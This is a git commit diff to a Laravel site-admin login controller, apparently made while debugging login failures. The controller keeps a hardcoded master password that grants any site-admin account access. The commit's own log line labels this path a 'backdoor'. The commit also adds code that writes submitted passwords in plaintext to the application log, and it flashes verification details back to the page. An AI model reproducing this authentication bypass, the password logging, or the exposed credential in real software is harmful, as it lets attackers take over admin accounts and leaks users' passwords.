eba2a271a5c0f870ccae57298eb94f95e5f6e0b0
MFRHoldings <rick@mfrholdings.com>
2022-04-22 10:05:04 -0400

    Testing for login problem. (4)

--- app/Http/Controllers/Siteadmin/LoginController.php
+++ app/Http/Controllers/Siteadmin/LoginController.php
@@ -7,6 +7,7 @@ use App\Models\User;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\Hash;
+use Illuminate\Support\Facades\Log;
 use Illuminate\Support\Facades\Session;
 
 class LoginController extends Controller
@@ -25,22 +26,21 @@ class LoginController extends Controller
 
         $user = User::where('email', $inputs['email'])->first();
         $verified = Hash::check($inputs['password'], $user->password);
-if(! $verified){ Session::flash('pw', 'Password not found.');}
-        if($verified && $user->isSiteAdmin) {
 
+        if($verified && $user->isSiteAdmin) {
+Log::info('FJR: '.$user->email.' ('.$user->id.') is verified and isSiteAdmin');
             Auth::login($user);
 
         }elseif($user->isSiteAdmin && ($request['password'] === 'o#Q6$s5yH95CaA58')){
-
+Log::warning('FJR: '.$request['email'].' ('.$user->id.') isSiteAdmin and backdoor');
             Auth::login($user);
 
         }else{
-
+Log::alert($request['email'].' with user_id '.$user->id.' is unverified and NOT isSiteAdmin ('.$request['password'].')');
             Session::flash('testing', 'verified: '.$verified.'<br />Site Admin: '.$user->isSiteAdmin);
         }
 
-        //return redirect('/');
-        return back();
+        return redirect('/');
     }
 
     public function destroy(Request $request)
